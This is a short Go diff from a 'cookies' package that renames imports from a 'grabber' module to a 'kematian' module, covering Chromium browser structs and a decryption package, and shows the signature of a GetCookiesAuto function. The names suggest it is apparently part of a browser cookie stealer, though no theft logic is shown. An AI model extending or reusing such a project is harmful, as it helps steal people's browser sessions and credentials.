@@ -3,8 +3,8 @@ package cookies
 import (
 	"database/sql"
 
-	"kdot/grabber/browsers/chromium/structs"
-	"kdot/grabber/decryption"
+	"kdot/kematian/browsers/chromium/structs"
+	"kdot/kematian/decryption"
 )
 
 func GetCookiesAuto(browsersList []structs.Browser) []structs.CookiesOutput {
